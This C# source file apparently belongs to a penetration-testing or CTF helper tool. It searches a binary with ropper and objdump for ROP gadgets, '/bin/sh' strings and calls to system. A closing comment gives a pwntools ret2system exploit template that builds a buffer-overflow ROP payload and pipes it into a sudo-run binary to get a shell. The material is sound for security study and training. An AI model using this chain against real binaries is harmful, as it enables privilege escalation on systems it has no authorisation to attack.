using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Reecon
{
    class Pwn
    {
        public static void Scan(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("LFI Usage: reecon -rop fileNameHere");
                return;
            }
            string fileName = args[1];
            if (!File.Exists(fileName))
            {
                Console.WriteLine(fileName + " does not exist.");
            }
            ScanFile(fileName);
        }

        private static void ScanFile(string fileName)
        {
            if (General.IsInstalledOnLinux("ropper"))
            {
                Console.WriteLine("Searching for 'pop rdi; ret;'");
                List<string> ropperOutput = General.GetProcessOutput("ropper", $"--nocolor --file {fileName} --search \"pop rdi; ret;\"");
                foreach (string item in ropperOutput)
                {
                    if (!item.StartsWith("[INFO]") && !item.StartsWith("[LOAD]"))
                    {
                        Console.WriteLine("pop rdi; ret; --> " + item);
                    }
                }
                Console.WriteLine("Searching for '/bin/sh'");
                ropperOutput = General.GetProcessOutput("ropper", $"--nocolor --file {fileName} --string \"/bin/sh\"");
                foreach (string item in ropperOutput)
                {
                    if (!item.StartsWith("[INFO]") && !item.StartsWith("[LOAD]") && item.Contains("/bin/sh"))
                    {
                        Console.WriteLine("/bin/sh --> " + item);
                    }
                }
                // // ropper --file sudo_pwn_file_here --string "/bin/sh"
            }
            else
            {
                Console.WriteLine("Error - ropper is not installed.");
            }
            if (General.IsInstalledOnLinux("objdump"))
            {
                Console.WriteLine("Searching for a system call...");
                List<string> objdumpOutput = General.GetProcessOutput("objdump", $"-D {fileName}");
                foreach (string item in objdumpOutput)
                {
                    if (item.Contains("call") && item.Contains("system")) // callq contains call
                    {
                        Console.WriteLine("system: --> " + item);
                    }
                }
            }
            else
            {
                Console.WriteLine("Error - objdump is not installed");
            }
            Console.WriteLine("Finished");
        }
        // For Reversing - I doubt this will ever get really used, so it's more just useful reversing stuff

        // Rop Chain Shellcode Breakdown
        // https://medium.com/@iseethieves/intro-to-rop-rop-emporium-split-9b2ec6d4db08

        // from pwn import *
        // elf = context.binary = ELF('./sudo_pwn_file_here')

        // # Start
        // io = process(elf.path)

        // # Cyclic Crash
        // io.sendline(cyclic(512))

        // # Wait for it to crash
        // io.wait()

        // # Read the core file of the crash
        // core = io.corefile

        // # read the stack point at the time of the crash
        // stack = core.rsp

        // # Find the offset
        // pattern = core.read(stack, 4)
        // offset = cyclic_find(pattern)

        // ropper --file sudo_pwn_file_here --search "pop rdi; ret;"
        // ropper --file sudo_pwn_file_here --string "/bin/sh"
        // objdump -D ./sudo_pwn_file_here | grep system

        // rop_chain = p64(pop_rdi, endian= "little")
        // rop_chain += p64(bin_sh, endian= "little")
        // rop_chain += p64(system, endian= "little")

        // # Add the padding so it does it after the crash spot
        // padding = cyclic(offset)

        // payload = padding + rop_chain
        // f = open('exploit','wb')
        // f.write(payload)
        // f.close()

        // Usage: (cat exploit; cat) | sudo /sudo_pwn_file_here
    }
}
